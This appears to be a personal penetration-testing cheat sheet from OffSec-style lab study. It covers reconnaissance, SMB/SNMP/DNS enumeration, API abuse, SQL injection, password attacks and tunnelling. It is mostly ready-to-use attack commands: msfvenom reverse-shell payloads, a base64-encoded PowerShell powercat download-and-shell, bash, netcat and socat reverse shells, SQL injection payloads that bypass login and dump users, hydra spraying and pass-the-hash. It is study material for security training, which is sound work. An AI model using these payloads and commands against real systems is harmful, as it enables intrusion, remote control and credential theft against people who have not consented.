
# VMs

##### Fixing 'Same UUID as an existing virtual machine' error with new machine creation

From the .vbox & .vdi directory:
- Run internal commands on the .vdi file twice
```bash
VBoxManage internalcommands sethduuid kali-linux-2023.3-virtualbox-amd64.vdi
	UUID changed to: b03b0789-6780-402e-8baa-3173d0cff886

# Run again 
VBoxManage internalcommands sethduuid kali-linux-2023.3-virtualbox-amd64.vdi
	UUID changed to: 0874ee2c-afc4-4da1-8859-31b2325b4143
```

- Change the 3 UUIDs in the .vbox file
```bash
vim kali-linux-2023.3-virtualbox-amd64.vbox

# Line 9 - First run uuid result
<Machine uuid="{b03b0789-6780-402e-8baa-3173d0cff886}" name="kali-linux-2023.3-virtualbox-amd64" OSType="Debian_64" snapshotFolder="Snapshots" lastStateChange="2024-06-28T19:21:46Z">

# Line 37 - Second run uuid result
<HardDisk uuid="{0874ee2c-afc4-4da1-8859-31b2325b4143}" location="kali-linux-2023.3-virtualbox-amd64.vdi" format="vdi" type="Normal"/>

# Line 82 - Second run uuid result
<Image uuid="{0874ee2c-afc4-4da1-8859-31b2325b4143}"/>
```

##### chmod for all directories recursively

```
find . -type d -print0 | xargs -0 chmod 0755
```

##### chmod for all files recursively

```
find . -type f -print0 | xargs -0 chmod 0644
```

##### [Updating postgresql](https://medium.com/@gembit.soultan/how-to-upgrade-postgresql-15-to-postgresql-16-using-pg-upgradeclusters-in-ubuntu-22-04-c9f279c5d3ab)



# Misc



File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx`
```powershell
# PS example
Get-ChildItem -Path C:\ -Include *.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx -Recurse -ErrorAction SilentlyContinue -Force
# Will likely net a lot of .ini files.  Be very careful
```

##### Search for msfvenom payloads
```bash
msfvenom -l payloads --platform windows --arch x64 
	...
	windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
	...
	windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
	...
```

##### Automate confirmation when running a command w/in a limited shell on Windows
```powershell
cmd.exe /c echo y | [cmd]
```

##### Reboot system
```powershell
shutdown /r /t 0
```
##### Use active mode, binary transfer, put .exe on Linux
```bash
ftp <victim_IP>
# Login as anonymous; no pw
ftp> passive
	Passive mode: off; fallback to active mode: off
ftp> binary
	200 Type set to I.
ftp> put SpotifySetup.exe
```

##### Sample files for exploits (.jpgs, .ico, .bmp, .png, .txt, etc)
```bash
ls /var/lib/inetsim/http/fakefiles/
```
##### Copy file contents to clipboard
```bash
xclip -sel c < input_file
```

##### Allow any stderr to get connected to stdout input
```bash
|&
2>&1
```

##### Ensure bash one-liner runs in bash (rather in sh shell)
```bash
bash -c "bash <oneliner>"

# example bash reverse shell
```


##### RDP to Win and mounting a shared folder
```bash
# xfreerdp
xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents

# rdesktop
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents
```

##### Setup WebDAV server
```bash
# Install
pip3 install wsgidav

# Create dir for server
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt

# Run server
# Host serving from 0.0.0.0 (listening on all interfaces)
# Port 80
# Disable authentication on the share
# Set root of directory to the /home/kali/webdav/ folder
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

#### Reverse shells
##### Simple reverse shell .exe for Windows
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o /tmp/<evil.exe>
```
##### Use PowerShell (pwsh on Kali) to base64 encode powercat download & reverse shell
```powershell
$TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
# Print encoded text
$EncodedText       
```
##### Bash
```bash
/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```
##### Using named pipes
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.214 4444 >/tmp/f
```
##### NC
```bash
nc -e /bin/sh 10.0.0.1 1234
```


#### PowerShell

##### Run PowerShell in Bypass mode
```powershell
powershell -ep bypass
```

##### Get system info
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
```

##### Get local users on a machine
```powershell
Get-LocalUser
```

##### Get user's groups
```powershell
# Doesn't necessarily get all groups.   Can use `net user <user> for each user's complete groups`
whoami /groups
```
##### Get user's privileges
```powershell
whoami /priv
```

##### Get user's integrity level
```powershell
# Ensure correct module is in use
Import-Module NtObjectManager

Get-NtTokenIntegrityLevel
```

##### Get existing groups on a machine
```powershell
Get-LocalGroup
```

##### Get members of a specific group
```powershell
Get-LocalGroupMember <group>
```

##### Get user's PS history
```powershell
# PS history
Get-History

# PSReadline
(Get-PSReadlineOption).HistorySavePath
```

##### Query registry keys to list applications
```powershell
# 32-bit Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit Applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

##### Get list of running programs
```powershell
Get-Process
```

##### Get list of installed services
```powershell
# Must be RDP'd in (Perm Denied error with shells)
PS C:\Users\steve> Get-Service

# Running services only
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Running services *not* in C:\windows\system32
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | ?{($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}

# GUI
services.msc
```

##### Get list of scheduled tasks
```powershell
# Long list output.  Best to either save to file or narrow down
schtasks /query /fo LIST /v

# Show only scheduled tasks that *aren't* run by Microsoft
PS C:\Users\steve> Get-ScheduledTask | select-object TaskName,Author | ?{$_.Author -notlike "Microsoft*"}

# Get task path & next run time
PS C:\Users\steve>  Get-ScheduledTask -TaskName "<TaskName>" | Get-ScheduledTaskInfo

# Get verbose info on task
schtasks /query /tn "\<TaskPath>\<TaskName>" /fo LIST /v
```

##### Get user who started service
```powershell
Get-CimInstance -ClassName win32_service -Filter "name='BackupMonitor'" | select StartName
```

##### Enumerate file permissions
```powershell
icacls "c:\xampp\mysql\bin\mysqld.exe"

Get-ACL "c:\xampp\mysql\bin\mysqld.exe"
```

##### Find file recursively
```powershell
Get-ChildItem -Path C:\ -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force
```

##### Search for process path via PID
```powershell
Get-Process -Id <PID> -FileVersionInfo | Select FileName
```

##### Read contents of a file
```powershell
Get-Content file.txt

# Alternately
gc file.txt
```

##### Grep part of a string from output
```powershell
... | Out-String -Stream | Select-String "OS{"
```

##### Run command as another user
- Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM
```powershell
runAs /user:<user> <command>
	Enter the password for <user>:
	Attempting to start <command> as user "<domain>\<user>" ...
```

##### Cmdline for opening up PowerShell with 'run as Admin' (PS terminal with High vs Medium Mandatory level)
```powershell
Start-Process powershell.exe -Verb runAs
```

##### Default config files

Confluence (on linux) - `/var/atlassian/application-data/confluence/confluence.cfg.xml`




# OSINT

### [whois](Tools.md#whois)

##### Forward Lookup:
```bash
whois megacorpone.com -h 192.168.50.251
```

##### Reverse Lookup:
```bash
whois 38.100.193.70 -h 192.168.50.251
```

### [Google Dorks](Tools.md#Google%20Dorks)  
##### Limit to single domain:
```bash
site:megacorpone.com
```

##### Search for subdomains while ignoring *www*.  
```bash
site:*.megacorpone.com -site:www.megacorpone.com
```

##### Remove html pages from a search:
```bash
site:megacorpone.com -filetype:html
```

##### Search for filetypes:
```bash
site:megacorpone.com filetype:php
site:megacorpone.com ext:jsp
site:megacorpone.com ext:cfm
site:megacorpone.com ext:pl
```

##### Pages with given words or strings in them:
```bash
intitle:“index of” “parent directory”
```
	Shows results w/ “index of” in the title and “parent directory” somewhere on the page.  

### [Netcraft](Tools.md#Netcraft)
### [GitLeaks](Tools.md#GitLeaks)
### [GitRob](Tools.md#GitRob])
### [Shodan.io](Tools.md#Shodan%29io)

##### Filters:
```bash
hostname:megacorpone.com
port:"22"
```

[Security Headers](Tools.md#Security%20Headers)
[SSL Server Test](Tools.md#SSL%20Labs)


### [recon-ng](Tools.md#recon%28ng) -removed

##### Create workspace:
```bash
workspaces create wksp_name
```

##### Return to/ work in workspace:
```bash
recon-ng -w wksp_name
```

##### Display list of all modules:
```bash
marketplace search
```

##### Display list of all ssl modules:
```bash
marketplace search ssl
```

##### Find info on a specific module:
```bash
marketplace info ssltools
```

##### Install and load module:
```bash
marketplace install hackertarget
marketplace load hackertarget
```

##### Show options and set source:
```bash
show options
options set SOURCE site.com
```

##### View inputs:
```bash
input
```

##### Execute:
```bash
run
```

### [pastebin](https://pastebin.com) -removed
### [theHarvester](Tools.md#theHarvester) -removed

##### Search emails from a domain, limiting the results to 500, using DuckDuckGo:
```bash
theHarvester -d kali.org -l 500 -b duckduckgo
```
	-d - Searches given domain  
	-b - Utilizes given source (ie: google, baidu, twitter, etc) Needs API for some sources  
	-g - Uses Google Dorks  
	-s - Utilizes Shodan

### [social-searcher](https://www.social-searcher.com) -removed

### [haveibeenpwned.com/PwnedWebsites](https://haveibeenpwned.com/PwnedWebsites) -removed

### [twofi](Tools.md#twofi) -removed

### [linkedin2username](Tools.md#linkedin2username) -removed

### [OSINT Framework](https://osintframework.com) -removed

### [maltego](https://www.maltego.com/maltego-community/) -removed


# Enumeration
- check ftp  
- check rpcclient w/ null or guest login  
- check enum4linux  
- check smbclient/ cme smb  
- check ldapsearch  
- check [dig](Tools.md#dig) & [dnsrecon ](Tools.md#dnsrecon) 
- [dirb](Tools.md#dirb) running w/ file exts (php, txt, html, asp)

## DNS

### [host](Tools.md#host)
##### NameServers:
```bash
host -t ns google.com | cut -d " " -f 4
```

##### Forward Lookup Brute Force:
```bash
for ip in $(cat /usr/share/seclists/); do host $ip.megacorpone.com; done
```

##### Reverse Lookup Brute Force:
```bash
for ip in $(seq 200 225); do host 51.222.169.$ip; done | grep megacorpone | grep -v "not found"
```

##### Zone Transfers:
```bash
host -l megacorpone.com ns1.megacorpone.com
```

##### \<axfr.sh & axfr.py\>:
```bash
#!/bin/bash
#Zone Transfer bash script
if [ -z "$1" ]; then
	echo "[*] Simple Zone transfer script"
	exho "[*] Usage   :  $0 <domain name>"
	exit 0
fi

for server in $(host -t ns $1 | cut -d " " -f 4); do
	host -l $1 $server | grep "has address"
done
```


### [dnsrecon](Tools.md#dnsrecon)

##### Perform a standard scan:
```bash
dnsrecon -d megacorpone.com -t std
```

##### Perform a brute force attack on a domain using a file with potential subdomain strings:
```bash
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

##### Perform a standard scan brute force attack on a domain using a hostname dictionary and save output as an xml:
```bash
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
```

### [dnsenum](Tools.md#dnsenum)

##### Run a simple DNS enumeration scan:
```bash
dnsenum megacorpone.com
```

##### Don't reverse lookup a domain, and output to an xml file:
```bash
dnsenum --noreverse -o mydomain.xml example.com
```


### [nslookup](Tools.md#nslookup) - Windows

##### Simple A record query:
```powershell
nslookup mail.megacorptwo.com
```

##### Query a given DNS server (192.168.50.151) about a TXT record that belongs to a specific host (info.megacorptwo.com):
```powershell
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

##### Enable debug mode, grabbing IPv4 & IPv6, combining record types, using recursive lookup on 1.1.1.1 DNS server, w/o searching the domain
```powershell
nslookup -debug -type=A+AAAA -nosearch -recurse mydomain.com 1.1.1.1
```


### [dig](Tools.md#dig) -removed

##### Search A records:
```bash
dig megacorpone.com
```

##### Search TXT records:
```bash
dig TXT megacorpone.com
```

##### Search all records:
```bash
dig ANY megacorpone.com +noall +answer
```

##### Zone Transfers:
```bash
dig axfr google.com

dig google.com ANY +nostat +nocmd +nocomments
```

### [Sublist3r](Tools.md#sublist3r) -removed

##### Enumerate subdomains of a specific domain:
```python
python sublist3r.py -d example.com
```

##### Enumerate subdomains and show only those with open ports 80 & 443
```python
python sublist3r.py -d example.com -p 80,443
```

##### Enable brute force module
```python
python sublist3r.py -b -d example.com
```

##### Use specific search engines
```python
python sublist3r.py -e google,yahoo,virustotal -d example.com
```



## Port Scanning:
### [netcat](Tools.md#netcat)


##### Scan all Top Ports
```bash
nc -zv 10.4.153.63 1-1024 2>&1 | grep succeeded
```

##### Scan for all hosts using a specific service
```bash
# Example scanning for SMB
for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 445 2>&1 | grep succeeded; done
```

##### TCP scanning:  
```bash
nc -nvv -w 1 -z 10.11.1.220 3388-3390
```

##### UDP scanning:  
```bash
nc -nv -u -z -w 1 10.11.1.115 160-162
```


##### Scan top ports of all IPs in a /24 subnet
```bash
# Careful.... this takes FOREVER
for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 1-1024 2>&1 | grep succeeded; done
```


### [nmap](Tools.md#nmap)

##### SYN scan:
```bash
sudo nmap -sS 192.168.50.149
```

##### TCP Connect scan:
```bash
nmap -sT 192.168.50.149
```

##### UDP scan:
```bash
sudo nmap -sU 192.168.50.149
```

##### SYN & UDP scan:
```bash
sudo nmap -sU -sS 192.168.50.149
```

##### Network Sweep exported to grep'able format & view only hosts reported as "Up":
```bash
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt

grep Up ping-sweep.txt | cut -d " " -f 2
```

##### Scan multiple IPs for top ports:
```bash
nmap -sT -A --top-ports=20 192.168.50.-253 -oG top-port-sweep.txt
```
	**-sT** - Connect scan  
	**-A** - Aggressive scan: OS detection, traceroute, script scanning  
	**--top-ports** - Scans for given number (20) of top ports (determined within _/usr/share/nmap/nmap-services_)
	**-oG** - Output grep'able format

##### OS Fingerprinting:
```bash
sudo nmap -O 192.168.50.14 --osscan-guess
```

##### Banner Grabbing:
```bash
nmap -sT -A 192.168.50.14
```

##### NSE:
```bash
nmap --script http-headers 192.168.50.6
nmap --script-help http-headers
```

##### NSE script search:
```bash
grep <script keyword> /usr/share/nmap/scripts/script.db
```

##### NSE - Aggressive, Service version, UDP scan using all default enumeration scripts
```bash
sudo nmap -A -sV -sC -sU 192.168.50.14 --script=*enum -vv
```


##### Scan all ports, skip host discovery - Removed
```bash
sudo nmap -n -Pn -p- -vv 192.168.195.11
	(may need to add --max-scan-delay=0)
```

```bash
sudo nmap 192.168.50.14 -p- -sV -vv --open --reason  
```

##### FW/ IDS Evasion: - Removed
```bash
nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.232.227
```
	*Note: Need to specify interface & disable Ping Scan:


### PowerShell port scanning

##### Single port scan:
```powershell
Test-NetConnection -Port 445 192.168.50.151
```
##### Multiple port scan (takes forever):
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

### [masscan](Tools.md#masscan) - removed

```bash
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
```


## SMB:

### [nmap](Tools.md#nmap)

##### Enumerate SMB & NetBIOS using all NSE SMB scripts:
```bash
nmap -v -p 139,445 --script=smb* -oG smb.log 10.11.1.1-245
```

##### OS Discovery:
```bash
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

##### SMB RCE Vuln:
```bash
nmap -v -p 139,445 --script smb-vuln-ms08-067 --script-args=unsafe=1 192.168.50.152
```
	w/ Script parameter set to **unsafe=1**, the scripts that run are almost/ totally guaranteed to crash a vulnerable system.
	  Use extreme caution when enabling this arg.

### [nbtscan](Tools.md#nbtscan)

##### Scan network for NetBIOS info:
```bash
# -r specifies the originating UDP port as 137
sudo nbtscan -r 10.11.1.0/24
```

### [smbmap](Tools.md#smbmap)

##### Enumerate shares & output to file
```bash
smbmap -H <ip> | tee smb.log
```

### net view

##### View all information about the domain controller DC01:
```powershell
net view \\dc01 /all
```


### [enum4linux](Tools.md#enum4linux)

##### Get userlist and OS info:
```bash
enum4linux -U -o 192.168.1.200
```


### [smbclient](Tools.md#smbclient)

##### List shares:
```bash
smbclient -L //IP
smbclient -L <ip>
smbclient -L //IP -I "DOMAINNAME\User"
```

##### Connect:
```bash
smbclient \\x.x.x.x\\share
smbclient -U "DOMAINNAME\User" //<ip>/IPC$ password
```

### [rpcclient](Tools.mdrpcclient)

##### Anonymous Connection:
```bash
rpcclient 10.10.0.1 -U "" -N 
```

##### Connect w/ User sec504:
```bash
rpcclient 10.10.0.1 -U sec504
```

Once Connected:
##### Get Server info:
```bash
srvinfo
```

##### Enumerate through info:
```bash
enumdomusers
enumdomgroups
enumalsgroups builtin
```

##### Get domain pw policy:
```bash
getdompwinfo
```


## SMTP

##### nmap enumeration:
```bash
sudo nmap -p 25 --script=smtp-enum* <target DOMAIN/ip>
```

##### Connect via NC:
```bash
nc -nv <ip> 25
```

##### Connect via Telnet:
```powershell
telnet <ip> 25
```

##### Start session and verify user:
```smtp
HELO <domain name OR ip>
VRFY <user>
EXPN <mailing list>
QUIT
```

##### Send email with [swaks](Tools.md#swaks):
```bash
swaks --to <victim> --from <abused email> --server <vic machine> --auth-user <abused user> -auth-password <abused pw> --attach <path to attachment ie: /home/kali/webdav/config.Library-ms> --header "test" --body "config file for software"
```

## SNMP
	(UDP protocol)

##### nmap enumeration:
```bash
sudo nmap -sU --open -p 161 <ip> -oG open-snmp.txt
```

### [onesixtyone](Tools.md#onesixtyone)

##### Create list of all potential ips:
```bash
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
```

##### Create list of services:
```bash
echo public > community
echo private >> community
echo manager >> community
```

##### Brute Force IPs for 'community' services:
```bash
onesixtyone -c community -i ips
```

##### Results will look like:
```bash
Scanning 254 hosts, 3 communities
192.168.247.151 [public] Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```
	Gives open host: 192.168.247.151 w/ public community

### [snmpwalk](Tools.md#snmpwalk)
##### MIB Tree Probe and Query Public Values:
```bash
snmpwalk -c public -v1 -t 10 <ip>
```
	Good for getting target email addresses

##### Users:
```bash
snmpwalk -c public -v1 <ip> 1.3.6.1.4.1.77.1.2.25
```

##### Running Processes:
```bash
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2
```

##### Open TCP Ports:
```bash
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.6.13.1.3
```

##### Installed Software:
```bash
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2
```


### [snmpcheck](Tools.md#snmpchec k)

couldn't get to work in lab

## NFS - Removed
```bash
nmap -sV -p 111 --script=nfs* <ip>
nmap -sV -p 111 --script=rpcinfo <ip>
```

```bash
mkdir home
sudo mount -o nolock <ip>:<nfs mount point> ~/home/
```

(Change UUID):
```bash
sudo sed -i -e 's/old_UUID/new_UUID/g' /etc/passwd
```

## Linux


##### Scanning for SMB hosts on a newly discovered subnet with nc
```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.163.$i 445 2>&1 | grep succeeded; done
```

##### Port scanning newly discovered endpoints with nc
```bash
nc -zv 10.4.247.63 1-1024 2>&1 | grep succeeded
```

##### Find existing binaries w/ SUID or GUID perms on them:  
```bash
find / -perm -u=s -type f 2>/dev/null
# OR
find / -perm -4000 -o- -perm -2000 -o- -perm -6000
```

##### Find files with (group or other or both) writable permission and SET UID set .  
```bash
find / -perm /022 -and -perm -4000 -exec ls -ldb {} ;
``` 
						^^^^           ^  
						| | | |        |-- So the SUID is 4  
						| | | |-- Other is writable (2)  
						| | |--Group permission is writable (2)  
						| |-- No owner permission mentioned (0)  
						|-- As the logic is OR - group or other or both  
So the logic is : ( group writable OR other writable ) AND SUID set  

##### List files with other writable excluding sticky bit set.  
```bash
find / -perm -002 -not -perm -1000 -exec ls -ldb {} ;
```  
						^^^^           ^  
						| | | |        |-- So the sticky bit is set (1)  
						| | | |-- Other is writable (2)  
						| | |--No group permission mentioned (0)  
						| |-- No owner permission mentioned (0)  
						|-- Well it does not matter if it is "-" or "/" as there is only one condition mentioned  
Now the logic here is : Other writable NOT sticky bit set



# Vuln Scanning

##### Scan for vulnerabilities using all NSE vuln scripts:
```bash
sudo nmap -sV --script="vuln" <ip>
```

##### Save custom written CVE NSE script found online:
```bash
# After finding via google; scan contents for potential malicious activity; if safe, save to NSE folder
sudo cp ~/Download/<cve-script> /usr/share/nmap/scripts/<CVE-name>.nse

# Update database
sudo namp --script-updatedb
```

# Web Apps

## Enum
Inspect:
- URLs
- Page Content
- Response Headers
- Sitemaps (robots.txt, sitemap.xml, etc)
- [Default admin consoles & logins](8.0.1%20-%20Admin%20Consoles.md)

### [nmap](Tools.md#nmap)
##### Grab web server's banner
```bash
sudo nmap -sV -p 80 <ip>
```

##### Perform initial fingerprint of web app
```bash
sudo nmap -p 80 --script=http-enum <ip>
```


### gobuster

##### Enumerate files and directories with a reduced number of threads (5) to keep traffic low:
```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```



### [dirb](Tools.md#dirb) - removed
```bash
dirb http://<domain> -r -z 10
```

### [nikto](Tools.md#nikto) - removed
```bash
nikto -host=http://<domain> -maxtime=30s
```

### [sublist3r](Tools.md#Sublist3r) - removed


## APIs

### via Cmdline

##### Create 'pattern' file for brute forcing API names
```bash
cat > pattern
	{GOBUSTER}/v1
	{GOBUSTER}/v2
	... etc
	#Ctrl D
```

##### Enumerate API with pattern file
```bash
gobuster dir -u http://<ip>:<API_port> -w /usr/share/wordlists/dirb/big.txt -p pattern
```

##### Inspect discovered API
```
curl -i http://<ip>:<API_port>/users/v1
```

##### Target users discovered
```bash
gobuster dir -u http://<ip>:<API_port>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

##### Probe via curl
```bash
curl -i http://<ip>:<API_port>/users/v1/admin/password
```

##### Check if *login* method is supported
```bash
curl -i http://<ip>:<API_port>/users/vi/login
```

##### Convert GET to POST and push payload in req'd JSON format
```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
```

##### Check and attempt *register* method is supported and register a new user
```bash
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/register
```

##### Add email for successful registry of new user and abuse possible *admin* key
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/register
```

##### Test newly created user by logging in
```bash
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
```
	Receive JWT token if successful

##### Change admin user's pw forging a POST request targeting that *password* API
```bash
curl \
'http://<ip>:<API_port>/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth <JWT token from logging in ^>' \
-d '{"password":"pwned"}'
```

##### Attempt above using PUT method
```bash
curl -X 'PUT' \
'http://<ip>:<API_port>/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth <JWT token from logging in ^^>' \
-d '{"password":"pwned"}'
```

##### Login w/ admin's newly-changed pw
```bash
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
```


### via BurpSuite



## Admin Consoles

#### [BurpSuite](burpsuite.md)
	Intruderd

## XSS



## SQLi

### psql
##### Show list of databases
```postgresql
\l
```

##### Use a specific database
```postgresql
\c <db name>
```

##### Show tables of a specific database
```postgresql
-- AFter using \c <db name> to enter into a database
\dt
```

##### Dump table
```postgresql
SELECT * FROM cwd_user;
```


### MySQL
##### MySQL login
```bash
# for Linux/ Mac(?)-based MySQL servers
mysql -u root -p 'root' -h 192.168.50.16 -P 3306

# for Windows-based MSSQL servers
impacket-mssqlclient Administrator:LAB123@192.168.50.18 -windows-auth
```

##### Retrieve SQL version
```sql
-- MySQL
select version();

-- Test.  Might only work for Windows-based MSSQL servers
SELECT @@version;
```

##### Retrieve current username & hostname for the connection
```sql
-- MySQL
select system_user();
```

##### Retrieve list of all databases running in the session
```sql
-- MySQL
show databases;

--MSSQL
SELECT name FROM sys.databases;
```

##### Retrieve *offsec user* and *authentication_string* value belonging to the *user* table
```sql
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

##### Retrieve tables of a specific database
```sql
-- MySQL
select

-- MSSQL
SELECT * FROM <db>.information_schema.tables;
```

##### Retrieve table data
```sql
-- MySQL
show tables from <db>;

-- MSSQL
select * from <db>.dbo.<table_name>;
```

##### Search for tables within all databases
```sql
SELECT table_schema as database_name, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema not in ('information_schema','mysql','performance_schema','sys') ORDER BY database_name, table_name;
```

### In URL or vuln field
##### Test Auth Bypass
```sql
-- In form field
-- Prepend '
OR 1=1-- //

-- Test further
-- Prepend '
OR 1=1 in (select @@version)-- //
```

##### Retrieve users
```sql
-- All users
-- Prepend '
OR 1=1 in (select * from users)-- //

-- Specific user
-- Prepend '
OR 1=1 in (select password from users where username = 'admin')-- //
```

##### Determine number of db's column
```sql
-- Increase number up until error message is achieved.  Latest successful number is the # of columns
-- Prepend '
order by 1-- //
```

##### Enumerate current db, user, & MySQL version
```sql
-- Using % for wildcard
-- Prepend '
-- First column should be null as it doesn't return string values (reserved for ID field consisting of an integer data type)
%' UNION SELECT null, database(), user(), @@version, null-- //
```

#####  Retrieve columns table from *information_schema* db
```sql
-- Prepend '
UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database()-- //
```

#####  Dump *users* table
```sql
-- Prepend '
UNION SELECT null, username, password, description, null FROM users-- //
```

#####  Time-based SQLi payload
```sql
-- In url.  Requires PHP $_GET variable and parameters passed in URL
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false')-- //
```



Linux PrivEsc:

##### perl
```bash
sudo /usr/bin/perl -e 'exec("/bin/bash")'
```


# Client-side Attacks

## Target Recon

##### Display duplicated and unknown metadata tags of a *supported* file
```bash
exiftool -a -u brochure.pdf
```

##### Collect OS & browser info
https://canarytokens.com

## MS Office

# Password Attacks

\*\*\*NOTE:   If `INFO: Removed 3 hashes found as potfile entries.` is displayed in your hashcat output, it is because you've already cracked the hash.
- You can find it located in the **hashcat.potfile** `find / -name hashcat.potfile 2>/dev/null`

##### Attack SSH using rockyou.txt
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<IP>
```

##### Spray Attack RDP
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


##### Pass-the-Hash to SMB share
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```


# Port Forwarding & SSH Tunneling
## nc

##### Relay
```bash
mknod <pipe> p; nc -l -p <port> < <pipe> | nc <ip> <new_port> > <pipe>
```

## socat

##### File transfers from:  
```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```
	Very important! no space after comma  
	◇ **TCP4-LISTEN** - Creates IPv4 listener : port  
	◇ **fork** - Creates a child process once connection is made to the listener allowing for multiple connections  
	◇ **file:** - Specifies name of file to be transferred  
  
##### File transfers to:  
```bash
socat TCP4:ip_address:443 file:received_secret_passwords.txt,create
```
	Very important! no space after comma  
	◇ **TCP4** - Specifies IPv4 : ip address : port  
	◇ **file** - Specifies local file name to save the file to  
	◇ **create** - Specifies that a new file will be created  
  
##### Reverse shell Listener/ Attacker:  
```bash
socat -d -d TCP4-LISTEN:443 STDOUT
```
	**-d -d** for extra verbosity  

##### Reverse shell Victim:  
```bash
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

##### Encrypted Bind Shells: 
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt  
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
◇ Use [openssl](openssl.md) to create an SSL cert to help evade IDSs.  
◇ Convert the key and cert into a format that **socat** will accept: _.pem_  
  
##### Encrypted Bind Shell Listener/ Victim:  
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
``` 
	◇ **OPENSSL-LISTEN** - Creates SSL listener : port  
	◇ **cert =** - Specifies cert file  
	◇ **verify** - Disables SSL verification  
	◇ **fork** - Spawn a childproc once connection is made  
  
##### Encrypted Bind Shell Attacker:  
```bash
socat - OPENSSL:10.11.0.4:443,verify=0
```
	◇ **-** - Specifies transfer of data from STDIO to remote host  
	◇ **OPENSSL:** - Establishes remote connection to SSL listener : ip address : port  
	◇ **verify=0** - Disables SSL cert verification


## ssh
- All commands need to be executed on the compromised WAN facing machine.

##### Local Port Forward
```bash
ssh -N -L 0.0.0.0:4455:172.16.163.217:445 database_admin@10.4.163.215
```
	-L - Local port forward.  Takes args as two sockets:
	IP:PORT:IP:PORT - First socket is listening socket bound to the SSH client machine.  Second socket is where we want to forward the packets to.
	database_admin@10.4.163.215 - Rest of the SSH command is as usual; pointed at the SSH server and user we wish to connect as.

##### Local Dynamic Port Forward
```bash
# Only need the listening socket
ssh -N -L 0.0.0.0:9999 database_admin@10.4.233.215
```

